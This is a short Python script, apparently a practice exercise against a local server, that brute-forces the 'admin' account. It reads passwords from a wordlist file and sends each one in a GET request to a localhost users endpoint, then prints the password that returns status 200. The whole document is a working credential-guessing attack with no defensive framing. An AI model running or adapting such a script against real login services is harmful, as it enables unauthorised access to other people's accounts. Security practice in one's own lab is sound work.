import requests

# Reading passwords from file and saving them in an array
with open('passwords.txt', 'r') as password_file:
    words = password_file.readlines()
passwords = [word.strip() for word in words]
# print(passwords)

# Setting url and username
url = 'http://localhost:4000/users'
username = 'admin'

# Iterating through passwords in brute force attack
for password in passwords:
    response = requests.get(url + f'?login=admin&pass={password}')
    if response.status_code == 200:
        print('Request successful!')
        print(f'The password is: {password}')
        print('Response: ', response.text)
        break